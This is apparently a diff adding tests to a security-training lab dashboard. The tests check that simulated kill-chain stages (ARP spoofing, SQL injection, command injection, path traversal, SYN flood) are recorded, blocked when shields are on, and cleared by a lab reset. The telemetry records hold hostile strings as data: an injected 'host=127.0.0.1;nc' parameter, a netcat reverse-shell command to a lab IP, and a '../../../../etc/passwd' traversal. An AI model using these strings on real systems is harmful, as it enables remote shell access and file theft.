@@ -29,6 +29,22 @@ test('hub integration contracts', { timeout: 15000 }, async (t) => {
     res.setHeader('Content-Type', 'application/json');
     if (offline) { res.writeHead(503); res.end('{}'); return; }
     if (malformed) { res.end('{"unexpected":true}'); return; }
+    if (req.url?.endsWith('/api/system/reset')) {
+      setAllFlags(false);
+      res.end(
+        JSON.stringify({
+          status: 'success',
+          message: 'Target App đã được khôi phục về trạng thái sạch ban đầu (Reset 1-chạm)',
+          reset_summary: {
+            database: { clearedTables: ['orders', 'cart_items'], users: 5, products: 6 },
+            rate_limit_cleared: true,
+            defense_flags_reset: flags,
+          },
+          timestamp: new Date().toISOString(),
+        }),
+      );
+      return;
+    }
     if (req.url?.endsWith('/set')) {
       for (const flag of ['anti_sqli', 'rate_limit', 'input_sanitization']) assert.equal(body[flag], body.l3_master);
       setAllFlags(body.l3_master);
@@ -473,5 +489,78 @@ test('hub integration contracts', { timeout: 15000 }, async (t) => {
     const finalDefense = (await api('/api/defense/status')).data;
     assert.equal(finalDefense.defense_l1_network, false);
     assert.equal(finalDefense.defense_l2_os, false);
+  });
+
+  await t.test('W6-T1 & W6-ALL: 5-Stage Kill Chain tracking and 1-Touch Lab Reset (<3s SLA)', async () => {
+    // 1. Ensure all 3 shields are OFF so the 5-stage Kill Chain compromises every layer
+    await api('/api/defense/toggle', { layer: 'l1', enabled: false });
+    await api('/api/defense/toggle', { layer: 'l2', enabled: false });
+    await api('/api/defense/toggle', { layer: 'l3', enabled: false });
+    await api('/api/killchain/reset', {});
+
+    // Execute all 5 Kill Chain stages sequentially
+    const killChainPayloads = [
+      { endpoint: '/L2/arp-spoof', status_code: 200, method: 'ARP', response_time: 1, client_ip: '172.20.0.66', attack_tag: 'ARP_SPOOF', is_suspicious: true, payload_summary: {} },
+      { endpoint: '/api/auth/login', status_code: 200, method: 'POST', response_time: 12, client_ip: '172.20.0.66', attack_tag: 'SQL_INJECTION', is_suspicious: true, payload_summary: {} },
+      { endpoint: '/api/system/network-ping?host=127.0.0.1;nc', status_code: 200, method: 'GET', response_time: 22, client_ip: '172.20.0.66', attack_tag: 'COMMAND_INJECTION', is_suspicious: true, payload_summary: { shell_cmd: 'nc -e /bin/sh 172.20.0.66 4444' } },
+      { endpoint: '/api/files/download?name=../../../../etc/passwd', status_code: 200, method: 'GET', response_time: 9, client_ip: '172.20.0.66', attack_tag: 'PATH_TRAVERSAL', is_suspicious: true, payload_summary: {} },
+      { endpoint: '/L4/syn-flood', status_code: 503, method: 'TCP', response_time: 240, client_ip: '172.20.0.66', attack_tag: 'SYN_FLOOD', is_suspicious: true, payload_summary: {} },
+    ];
+    for (const pkt of killChainPayloads) {
+      assert.equal((await api('/api/telemetry', pkt)).status, 200);
+    }
+
+    const kcCompromised = (await api('/api/killchain/status')).data.kill_chain;
+    assert.equal(kcCompromised.active, true);
+    assert.equal(kcCompromised.current_stage, 5);
+    assert.equal(kcCompromised.stages.every((s: any) => s.state === 'COMPROMISED'), true);
+
+    // 2. Turn ON all 3 shields and verify subsequent attacks are recorded as BLOCKED in Kill Chain
+    await api('/api/defense/toggle', { layer: 'l1', enabled: true });
+    await api('/api/defense/toggle', { layer: 'l2', enabled: true });
+    await api('/api/defense/toggle', { layer: 'l3', enabled: true });
+
+    await api('/api/telemetry', {
+      endpoint: '/L2/arp-spoof',
+      status_code: 403,
+      method: 'ARP',
+      response_time: 1,
+      client_ip: '172.20.0.66',
+      attack_tag: 'ARP_SPOOF',
+      is_suspicious: true,
+      defense_action: 'blocked',
+      payload_summary: {},
+    });
+    const kcAfterShield = (await api('/api/killchain/status')).data.kill_chain;
+    const stage1 = kcAfterShield.stages.find((s: any) => s.stage === 1);
+    assert.equal(stage1.state, 'BLOCKED');
+    assert.equal(stage1.blocked_by, 'L1_NETWORK_SHIELD');
+
+    // 3. Execute 1-Touch Lab Reset (POST /api/lab/reset) and verify atomic clean restoration across Network, OS, Target App & Buffers
+    const resetEventPromise = once(socket, 'GOD_VIEW_RESET');
+    const resetRes = await api('/api/lab/reset', {});
+    assert.equal(resetRes.status, 200);
+    assert.equal(resetRes.data.success, true);
+    assert.equal(resetRes.data.status, 'CLEAN_STATE_RESTORED');
+    assert.equal(resetRes.data.reset_summary.network_arp_restored, true);
+    assert.equal(resetRes.data.reset_summary.os_reverse_shell_killed, true);
+    assert.equal(resetRes.data.reset_summary.target_app_reset, true);
+    assert.equal(resetRes.data.reset_summary.within_3s_sla, true);
+
+    // Verify Socket.IO broadcast GOD_VIEW_RESET
+    const [resetPayload] = await resetEventPromise;
+    assert.equal(resetPayload.reset_summary.target_app_reset, true);
+    assert.equal(resetPayload.network_state.mitm_active, false);
+    assert.equal(resetPayload.os_l7_state.reverse_shell.active, false);
+    assert.equal(resetPayload.os_l7_state.fd_metrics.open_fds, 42);
+    assert.equal(resetPayload.kill_chain.active, false);
+    assert.equal(resetPayload.kill_chain.stages.every((s: any) => s.state === 'IDLE'), true);
+
+    // Verify Ring Buffer is empty and all 3 shields are reset to false
+    const historyAfterReset = (await api('/api/telemetry/history')).data;
+    assert.equal(historyAfterReset.count, 0);
+    assert.equal(resetRes.data.defense_l1_network, false);
+    assert.equal(resetRes.data.defense_l2_os, false);
+    assert.equal(resetRes.data.defense_l3_app, false);
   });
 });
